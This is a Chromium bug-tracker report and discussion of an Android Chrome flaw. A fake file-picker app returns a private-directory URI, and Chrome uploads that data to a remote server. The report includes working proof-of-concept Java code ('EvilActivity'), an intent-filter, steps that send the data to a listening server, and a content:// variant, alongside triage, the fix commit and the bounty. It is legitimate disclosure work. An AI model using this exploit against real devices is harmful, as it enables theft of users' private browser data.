# Security: Steal arbitrary data in Android chrome private directory

| Field | Value |
|-------|-------|
| **Issue ID** | [40055231](https://issues.chromium.org/issues/40055231) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Forms>File, Mobile>Intents |
| **Platforms** | Android |
| **Reporter** | zy...@gmail.com |
| **Assignee** | fi...@chromium.org |
| **Created** | 2021-03-17 |
| **Bounty** | $5,000.00 |

## Description

Steps to reproduce the problem:
1.Install the poc app "setresultcontactphotocrop" in your android device
```EvilActivity```
public class EvilActivity extends AppCompatActivity {
    final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("user", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();

    }
```

```intent-filter```
  <activity android:name=".EvilActivity" >
             <intent-filter android:priority="100">
                 <action android:name="android.intent.action.GET_CONTENT"/>
                 <category android:name="android.intent.category.DEFAULT"/>
                 <data android:mimeType="*/*"/>
             </intent-filter>
        </activity>
```

2.listening port 2333 in local server(my ip is 192.168.1.199)

3.visit f.html via chrome, click choose file button and choose file mananger, choose the poc app "setresultcontactphotocrop"

4. you will find out that the data in Android chrome private directory "/data/data/com.chrome/canary" is upload to my server(I use /app_tabs/0/tab697 for proof, there are many config files in Android chrome private directory)

What is the expected behavior?
user cannot read the data in Android chrome private directory

What went wrong?
The data in Android chrome private directory is read and upload to third-party server

Did this work before? N/A 

Chrome version: 91.0.4435.3  Channel: n/a
OS Version: 
Flash Version:

## Attachments

- [f.html](attachments/f.html) (text/plain, 267 B)
- deleted (application/octet-stream, 0 B)
- [截屏2021-03-17下午5.10.46.png](attachments/截屏2021-03-17下午5.10.46.png) (image/png, 2.0 MB)
- [test_chrome.jpg](attachments/test_chrome.jpg) (image/jpeg, 1.9 MB)
- deleted (application/octet-stream, 0 B)

## Timeline

### [Deleted User] (2021-03-17)

[Empty comment from Monorail migration]

### zy...@gmail.com (2021-03-17)

[Empty comment from Monorail migration]

### zy...@gmail.com (2021-03-17)

The root cause is an attacker can hijacking android.intent.action.GET_CONTENT to fake a file manager, if victim choose it for picking files, the data in Android chrome private directory will be stealing.

### pa...@chromium.org (2021-03-18)

If I understand correctly, this is a potential issue in Android Framework, not specifically in Chrome/Chromium. I'll direct this to some Android Security people to see what they think.

### zy...@gmail.com (2021-03-19)

Hi thanks for your triaged, I think this is not a AOSP bug, any applications can register this intent-filter for faking a file picker, but the root cause is that chrome doesn't check the upload file's inputUri(localpath), if it is private directory path, chrome cannot read and upload it, I'm also test Google Drive upload function, my poc application "setresultcontactphotocrop" was also listed in the file pickers select list, but we cannot upload the private files to cloud drive.

By the way, I have report this bug to yandex and opera, they have confirm this issue.

### zy...@gmail.com (2021-03-19)

This issue can be reproduced on basic webview.

### zy...@gmail.com (2021-03-23)

And this cannot be reproduced on firefox for Android, firefox doesn't handle his private directory's files (/data/data/org.mozilla.firefox) in upload function.

### sh...@google.com (2021-03-23)

[Empty comment from Monorail migration]

### rs...@chromium.org (2021-03-23)

Capturing some email discussion:

I agree there is a Chrome bug here. I wasn't sure if there was a framework issue too, though, because ACTION_GET_CONTENT's documentation [1] says, "Output: The URI of the item that was picked. This **must** be a content: URI so that any receiver can access it" (emphasis mine).

But, Will pointed pointed out that "Even if the framework were to try and enforce that I think that is orthogonal from potential security issues; there are still scenarios where a malicious app could return a URI that results in a possible security bug if not handled properly by the receiving app. For example, a malicious app could return a content URI that points to a non-exported content provider in the receiving app."

It looks like the SelectFileDialog.java already tries to protect against uploading private data files in some cases [2], but that same check is not applied [3] when converting a CONTENT_SCHEME’s data to FILE_SCHEME. I think we’d also want to add a similar check when processing the result of the ACTION_IMAGE_CAPTURE [4].

And so also probably want to take Will’s point and verify that any CONTENT_SCHEME data aren’t coming from a non-exported component of Chrome.

[1] https://developer.android.com/reference/android/content/Intent#ACTION_GET_CONTENT
[2] https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=866;drc=5d60ceec700919b12597ce94c8496e087162c5c7
[3] https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=908;drc=5d60ceec700919b12597ce94c8496e087162c5c7
[4] https://source.chromium.org/chromium/chromium/src/+/master:ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java;l=638;drc=5d60ceec700919b12597ce94c8496e087162c5c7

[Monorail components: Blink>Forms>File]

### rs...@chromium.org (2021-03-23)

[Empty comment from Monorail migration]

[Monorail components: Mobile>Intents]

### [Deleted User] (2021-03-24)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### zy...@gmail.com (2021-03-26)

Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/

### zy...@gmail.com (2021-03-26)

Hi, maybe this is a webview framework issue too, developers who using webview always forget to limit the localpath of uploading files in their applications, so I think we could limit the localpath of upload feature to /sdcard or exclude this directory /data/data/ in webview to help developers mitigate this case.


### rs...@chromium.org (2021-03-29)

Yes, fixing this in SelectFileDialog.java should fix this for WebView too (WebView is powered by the same APK as Chrome).

### [Deleted User] (2021-03-31)

finnur: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### fi...@chromium.org (2021-04-09)

Sorry for the delay. I'll take a look at this on Monday, when I'm done with another security issue... :)

### qi...@chromium.org (2021-04-09)

is this a dup of 1195317?

### zy...@gmail.com (2021-04-10)

1189092<1195317

Maybe I report this earlier?

### rs...@chromium.org (2021-04-12)

Yes, if this is the same root cause, https://crbug.com/chromium/1195317 should be duped into here because this bug pre-dates it.

### fi...@chromium.org (2021-04-14)

I've uploaded a CL that fixes this issue, I believe. Happy to update if we think this could still be circumvented somehow...
https://chromium-review.googlesource.com/c/chromium/src/+/2823836

### fi...@chromium.org (2021-04-14)

[Empty comment from Monorail migration]

### zy...@gmail.com (2021-04-14)

Maybe you could consider some file provider like     final static String PRIVATE_URI = "file:///data/data/com.chrome.canary/app_tabs/0/tab697";


### zy...@gmail.com (2021-04-14)

Maybe you could consider handle some file providers too like     final static String PRIVATE_URI = "content://com.xxx.provider/xxx";


### zy...@gmail.com (2021-04-15)

And 1 more question:
For other browsers that use chromium, such as Samsung browser, opera and yandex, could this problem be fixed with this fix method?

### fi...@chromium.org (2021-04-16)

For the other browsers... I don't know. I guess it would work the same, unless they have diverged on this code path, but at that point there's not much I can do.

Also, I don't know enough about these content:// URIs to know how to construct one that points to a file inside the data directory. 
Do you have a more concrete example I can look at? 

I'll check this in now as-is and handle any remaining work as follow-up, if needed.

### zy...@gmail.com (2021-04-16)

I found other browsers like yandex,xiaomi,opera,samsung brower using chromium all affected by this case, so I think we shouldn't fix it just in /ui/base/SelectFileDialog.java, it just fix chrome, but other browsers are still not patched. 

And for content:// URIs, I will try my best to write a usable exploit code, and share with you.

### rs...@chromium.org (2021-04-16)

We have no control over downstream forks of Chromium. Once this is fixed in Chromium, Google Chrome and WebView will release it, and downstreams will have to integrate it.

### zy...@gmail.com (2021-04-16)

Okay, I will retest other downstream forks of Chromium after patched.

### fi...@chromium.org (2021-04-16)

[Comment Deleted]

### zy...@gmail.com (2021-04-16)

```
public class EvilActivity extends AppCompatActivity {
    final static String PRIVATE_URI = "content://media/external/downloads/196";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("wester", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();

    }
}
```

content://media/external/downloads/[num] can work, I success read and upload the file I downloaded before.

### qi...@chromium.org (2021-04-16)

download is not considered private. Chrome always downloads to a public dir (pre-Q), or public media store dir (Q+)

### gi...@appspot.gserviceaccount.com (2021-04-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f16e062ac20b5772684a1962e7a715a48dce3501

commit f16e062ac20b5772684a1962e7a715a48dce3501
Author: Finnur Thorarinsson <finnur@chromium.org>
Date: Fri Apr 16 16:29:38 2021

[Android]: Restrict upload locations.

PathUtils.GetDataDirectory() returns a child dir of the app's
data dir. By switching to ContextCompat.getDataDir we can
prevent other dirs, like cache, shared_prefs, etc,
from being uploaded.

Also extend the directory checks to a few places that were
missing it.

Bug: 1189092
Change-Id: I730671447451c52b927212681e695fe3093b8531
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2823836
Reviewed-by: Robert Sesek <rsesek@chromium.org>
Reviewed-by: Min Qin <qinmin@chromium.org>
Reviewed-by: Mugdha Lakhani <nator@chromium.org>
Reviewed-by: Finnur Thorarinsson <finnur@chromium.org>
Commit-Queue: Finnur Thorarinsson <finnur@chromium.org>
Cr-Commit-Position: refs/heads/master@{#873327}

[modify] https://crrev.com/f16e062ac20b5772684a1962e7a715a48dce3501/ui/android/BUILD.gn
[modify] https://crrev.com/f16e062ac20b5772684a1962e7a715a48dce3501/ui/android/java/src/org/chromium/ui/base/SelectFileDialog.java
[modify] https://crrev.com/f16e062ac20b5772684a1962e7a715a48dce3501/ui/android/junit/src/org/chromium/ui/base/SelectFileDialogTest.java
[modify] https://crrev.com/f16e062ac20b5772684a1962e7a715a48dce3501/weblayer/browser/android/javatests/src/org/chromium/weblayer/test/InputTypesTest.java


### fi...@chromium.org (2021-04-19)

Also, regarding https://crbug.com/chromium/1189092#c30 and 31 above: uploading files from the Downloads folder is a legitimate use-case. Extending the same mitigations to the Downloads folder would break that use case.

I'm wondering if we should mark this bug as fixed now...?

### zy...@gmail.com (2021-04-19)

yeah, I know uploading files from the Downloads folder is a legitimate use-case.

if user choose /sdcard/Downloads himself, it's indeed no problem, but when user click the third-party file manager app, he/she doesn't know it points to content://media/external/downloads/[num], this will allow the data downloaded by the user to be leaked.

so I think we shouldn't allow the protocol "content://" in here.

### zy...@gmail.com (2021-04-19)

only allow protocol "file://", and exclude private directories.

### fi...@chromium.org (2021-04-19)

Interesting idea. I would like to hear whether qinmin and rsesek think that is a viable approach.

### qi...@chromium.org (2021-04-19)

Why content://media/external/downloads/xxx cannot be leaked?  The content://media/external/downloads/xxx  is  in the public MediaStore, and Chrome grants other apps to read those content URIs when it downloads the file.  Android has better permission controls on content URIs than file URIs. 

So if a user is using a third-party file manager app, the third-party file manager app can actually read the files in content://media/external/downloads/ by itself and upload them. And it doesn't need to involve select file dialog in Chrome. It is the same for file:/// if user is using an external sd card for download locations. 

### fi...@chromium.org (2021-04-20)

If the Downloads/ folder is the only concern then I think it is time to close this bug, given what qinmin@ said.

But before we do, can a content:// URI be constructed to point to the chrome private data directory?

### zy...@gmail.com (2021-04-20)

hide

### qi...@chromium.org (2021-04-20)

regarding #38, Chrome has fileProviders that can generate content URI and grant access to files.  Offline page, for example, use this to generate content URIs for offline pages. Download also uses it to generate content URIs for files on EXTERNAL sdcard. But all the use cases are limited to a small set of files. So If any one misbehaves, it is up to the corresponding team to determine whether the URI access is valid. 

### zy...@gmail.com (2021-04-21)

Yeah, I agree with you, so maybe we could mark this issue as fixed?

### zy...@gmail.com (2021-04-25)

Hi, please credit to @retsew0x01, thanks very much.

----------
My employer does not want us to report vulnerabilities, so I need to modify the id to achieve anonymity

### rs...@chromium.org (2021-04-27)

I’ve applied the SecurityEmbargo label to also prevent this issue from automatically becoming public.

I think we can mark this as Fixed now.

### [Deleted User] (2021-04-27)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-28)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-29)

Requesting merge to beta M91 because latest trunk commit (873327) appears to be after beta branch point (870763).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-29)

This bug requires manual review: M91's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), kbleicher@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-05-03)

I'm going to reject merge to M91; this feels like we should use all available bake time to discover unexpected consequences of adding this limitation, so we should let this organically release in M92.

### am...@chromium.org (2021-05-04)

[Empty comment from Monorail migration]

### am...@google.com (2021-05-12)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-05-12)

Congratulations! The VRP Panel has decided to award you $5,000 for this report. Nice work! 

### zy...@gmail.com (2021-05-13)

thanks for the bounty!

### qi...@chromium.org (2021-05-15)

[Empty comment from Monorail migration]

### am...@google.com (2021-05-17)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-07-19)

[Empty comment from Monorail migration]

### am...@google.com (2021-07-19)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-03)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2021-08-03)

[Empty comment from Monorail migration]

### rz...@google.com (2021-08-27)

Labeled as not applicable for M90-LTS because it only affects android.

### zy...@gmail.com (2022-04-08)

Hi, could you add a Restrict-View-SecurityEmbargo (RV-SE) label for this issue? I am preparing a security conference topic relate with this one, so I want to keep this issue privately for a while.

### rs...@chromium.org (2022-04-08)

On what date are you planning on disclosing the issue publicly? We can generally wait for your public disclosure if it is within a reasonable timeframe.

Also, please do not delete your attachments and comments on the bug, as they are part of this issue report. I have un-deleted them.

### am...@chromium.org (2023-04-06)

Removing RV-SE as it has been almost a year since this issue was restricted from disclosure. 

### am...@chromium.org (2023-04-06)

Also, I've noticed the report attachments were deleted so I've un-deleted them. As mentioned in https://crbug.com/chromium/1189092#c61, attachments and comments are considered part of the report, so please refrain from deleting them. 

### zy...@gmail.com (2023-04-07)

Sure, thanks for your friendly reminder.

### am...@chromium.org (2023-04-26)

[Description Changed]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1189092?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Forms>File, Mobile>Intents]
[Monorail mergedwith: crbug.com/chromium/1195317, crbug.com/chromium/1209326]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055231)*
